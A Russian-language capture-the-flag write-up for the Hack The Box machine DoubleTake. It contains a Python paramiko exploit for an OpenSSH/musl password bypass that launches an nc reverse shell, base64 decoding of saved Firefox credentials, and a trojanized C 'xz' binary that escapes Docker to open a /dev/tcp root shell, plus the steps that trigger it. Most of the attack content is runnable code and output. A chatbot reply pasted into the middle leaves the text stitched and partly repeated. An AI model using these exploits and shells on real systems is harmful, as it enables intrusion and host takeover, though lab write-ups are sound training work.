# DoubleTake

| | |
|---|---|
| **Платформа / Событие** | Hack The Box |
| **Категория** | — |
| **Сложность** | — |
| **Статус** | done |
| **Дата решения** | 2026-11-18 |
| **Ссылка на таск** | — |

Level: `Easy`
OS: `Linux`

## Description

> DoubleTake is an easy-difficulty Linux machine running an AI agent platform behind a Docker container. Port 22 serves SSH from an Alpine container with OpenSSH 10.6p1 compiled against musl. CVE-2026-123158 bypasses password authentication for the alpine user by sending a 300-byte password that causes musl's crypt() to return "*", matching the locked account's shadow entry. Inside the container, a saved Firefox login reveals credentials for the web application on port 80. The platform exposes a deploy endpoint that forwards archives to the Docker API's PUT /containers/{id}/archive. Docker 29.5.0 is vulnerable to CVE-2026-41567, which resolves decompression binaries from the container's overlay filesystem instead of the host's. Replacing /usr/bin/xz in the container and uploading a compressed archive through the deploy page causes the Docker daemon to execute the trojanized binary as host root.

# Solution

Начинаем с изучения машинки

```bash
sudo nmap -A -sC -sV -Pn --top-ports 20 -oN doubletake_scan.txt 10.129.180.242
```

Результат:

```text
Starting Nmap 7.95 ( https://nmap.org ) at 2026-11-16 17:21 MSK
Nmap scan report for 10.129.180.242
Host is up (0.26s latency).

PORT     STATE  SERVICE       VERSION
21/tcp   closed ftp
22/tcp   open   ssh           OpenSSH 10.6 (protocol 2.0)
23/tcp   closed telnet
25/tcp   closed smtp
53/tcp   closed domain
80/tcp   open   http          nginx 1.24.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-auth:
| HTTP/1.1 401 UNAUTHORIZED\x0D
|_  Basic realm=Zentara
110/tcp  closed pop3
111/tcp  closed rpcbind
135/tcp  closed msrpc
139/tcp  closed netbios-ssn
143/tcp  closed imap
443/tcp  closed https
445/tcp  closed microsoft-ds
993/tcp  closed imaps
995/tcp  closed pop3s
1723/tcp closed pptp
3306/tcp closed mysql
3389/tcp closed ms-wbt-server
5900/tcp closed vnc
8080/tcp closed http-proxy
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT       ADDRESS
1   236.08 ms 10.10.16.1
2   130.76 ms 10.129.180.242

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.21 seconds
```

При заходе на сайт нас встречает basic auth. но стандартные пароли не помогают, значит надо копать в ssh.
погуглив `OpenSSH 10.6 (protocol 2.0) CVE` находим:

```text
В OpenSSH 10.6 (которая является полной реализацией протокола SSH 2.0) CVE-идентификаторы изначально не назначались. Однако в версии 10.6p2, выпущенной 5 ноября 2026 года, была устранена уязвимость, получившая идентификатор CVE-2026-123158.
```

Или же `CVE-2026-123158 («sshole»)`:

- Функция хеширования `crypt()` из библиотеки `musl` возвращает символ `*` (звёздочку)
  при попытке обработать слишком длинный пароль (более 256 байт). 
- `OpenSSH` ошибочно считает этот результат совпадением со значением,
   сохранённым для учётной записи, у которой в поле пароля стоит `*` (что запрещает вход по паролю). 

- Атака возможна, только если на системе одновременно выполняются следующие условия:
  - Вход по паролю включён (это значение по умолчанию в `OpenSSH`). 
  - Существует учётная запись без пароля (например, пользователь только с ключом или системный пользователь `Alpine`). 
  - На системе есть хотя бы одна учётная запись с корректным хешем пароля.

Чтож нам надо найти эксплойт под эту уязвимость. 

Конечно. Вот готовый, структурированный райтап на основе того, что ты сделал. Я собрал воедино твои шаги, твой код и твои команды, чтобы получился полноценный и грамотный отчет.

Ты можешь скопировать этот текст в свой файл `DoubleTake.txt` (или `.md`), сохранить и проверить его на чистой машине после перезапуска.

***

На порту 80 нас встречает HTTP Basic Authentication (realm "Zentara"). Стандартные пароли (admin:admin) не подходят. Идем гуглить версию SSH. Находим **CVE-2026-123158** (также известную как "sshole").

## Foothold (CVE-2026-123158)

Уязвимость позволяет обойти аутентификацию по паролю для пользователя `alpine` (у которого в `/etc/shadow` стоит `*`). Из-за бага в `musl libc` отправка пароля длиной более 256 байт заставляет функцию `crypt()` вернуть `*`, что совпадает с хэшем заблокированного аккаунта.

**Важное условие:** Атака срабатывает только со **второй попытки** в рамках одного SSH-соединения. Первая попытка "прогревает" кэш соли.

Пишем скрипт на Python с использованием `paramiko`:

```python
import paramiko
import sys
import time

host = sys.argv[1]
port = 22
user = "alpine"
long_password = "A" * 300

# Наш IP и порт для reverse shell
YOUR_IP = "10.10.17.4"
YOUR_PORT = "4444"

print(f"[*] Подключаемся к {host}...")
try:
    transport = paramiko.Transport((host, port))
    transport.start_client()

    # 1. Прогрев (первая неудачная попытка)
    try:
        transport.auth_password(user, "wrong")
    except paramiko.ssh_exception.AuthenticationException:
        pass

    # 2. Эксплойт (вторая попытка с длинным паролем)
    transport.auth_password(user, long_password)
    print("[+] УСПЕХ! Аутентификация обойдена.")

    # 3. Отправляем reverse shell через mkfifo + nc (работает в Alpine без bash)
    command = f"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {YOUR_IP} {YOUR_PORT} > /tmp/f"
    
    print(f"[*] Выполняем команду: {command}")
    chan = transport.open_session()
    chan.exec_command(command)

    print("[*] Ждем 5 секунд, переходи в терминал с nc...")
    time.sleep(5) 

except Exception as e:
    print(f"[-] Ошибка: {e}")
finally:
    transport.close()
    print("[*] Скрипт завершен. Проверь nc.")
```

Запускаем слушатель `nc -lvnp 4444` и скрипт: `python3 exploit.py 10.129.180.242`. Получаем шелл пользователя `alpine`.

## Lateral Movement

Осматриваемся. Понимаем, что мы в Docker-контейнере:
```bash
ls -la
total 16
drwxr-sr-x    1 alpine   alpine        4096 Nov 10 20:15 .
drwxr-xr-x    1 root     root          4096 Nov 10 20:15 ..
drwxr-sr-x    3 alpine   alpine        4096 Nov 10 20:15 .mozilla
```

И видим следующией файлы:
```bash
tree
.
└── firefox
    ├── profiles.ini
    └── zentara.default
        ├── cert9.db
        ├── key4.db
        ├── logins.json
        ├── pkcs11.txt
        ├── prefs.js
        └── signedInUser.json
```

Среди прочего смотрим `logins.json`:

В файле лежат зашифрованные (на самом деле просто Base64) креды:
```json
"encryptedUsername": "Ym9i",
"encryptedPassword": "Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ=="
```

Декодируем:
```bash
echo Ym9i | base64 -d                    # bob
echo Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ== | base64 -d # CorrectHorseBatteryStaple
```

Получаем креды: `bob:CorrectHorseBatteryStaple`. Заходим по SSH под `bob` и читаем первый флаг:
```bash
ssh bob@10.129.180.242
cat ~/user.txt
```

## Privilege Escalation (CVE-2026-41567)

Заходим на веб-интерфейс `http://10.129.180.242` под кредами `bob`. Видим панель управления AI-платформой Zentara. На странице **Deploy** можно загружать архивы (`.tar`, `.tar.gz`, `.tar.xz`), которые распаковываются на сервере.

Docker 29.5.0 подвержен уязвимости **CVE-2026-41567**. При распаковке сжатых архивов Docker ищет бинарник для распаковки (например, `xz`) **внутри контейнера**, а не на хосте, и запускает его с правами **root на хосте**.

### Подготовка трояна

Пишем вредоносный `xz.c`, который запустит reverse shell от рута. Docker даст нам нужные привилегии.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mount.h>

int main(int argc, char *argv[]) {
    // Прыжок из контейнера на хост
    mount("proc", "/proc", "proc", 0, NULL);
    chroot("/proc/1/root");
    chdir("/");
    
    // Наш IP и порт
    execl("/bin/bash", "bash", "-c",
    "bash -i >& /dev/tcp/10.10.17.4/4444 0>&1", NULL);
    return 1;
}
```

Собираем статический бинарник и пакуем его в `plant.tar` с правами root (важно для успешной распаковки):
```bash
gcc -static -o xz xz.c
mkdir -p pkg/usr/bin
cp xz pkg/usr/bin/xz
cd pkg
sudo chown root:root usr/bin/xz
sudo chmod 755 usr/bin/xz
tar --owner=0 --group=0 -cf ../plant.tar usr/bin/xz
cd ..
```

Загружаем `plant.tar` через веб-интерфейс или `curl`, чтобы подменить настоящий `xz` в контейнере:
```bash
curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@plant.tar' \
-F 'workspace=/' \
http://10.129.180.242/deploy
```
*(Ожидаем статус `success`)*.
```bash
{"deployment":{"created_at":1794846487,"filename":"plant.tar","id":"dep-e15da7","size":768000,"status":"success","workspace":"/"},"status":"success"}
```

### Триггер уязвимости

Создаем минимальный `.tar.xz` архив-триггер. Docker попытается его распаковать, вызовет наш `xz` и выполнит его от рута:
```bash
echo "x" > t
tar cf - t | xz > trigger.tar.xz
```

Запускаем слушатель `nc -lvnp 4444` и отправляем триггер:
```bash
curl -u bob:CorrectHorseBatteryStaple \
-F 'archive=@trigger.tar.xz' \
-F 'workspace=/workspace' \
http://10.129.180.242/deploy
```
*(Сервер вернет `500 Internal Server Error` — это нормально, так как троян запустит шелл и оборвет соединение).*
```bash
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>
```

Переключаемся в терминал с `nc`. Получаем **root**:
```bash
root@doubletake:/# id
uid=0(root) gid=0(root) groups=0(root)

root@doubletake:/# cat /root/root.txt
f7c0c8ee099c1f9edfa0b08d00cb9779
```

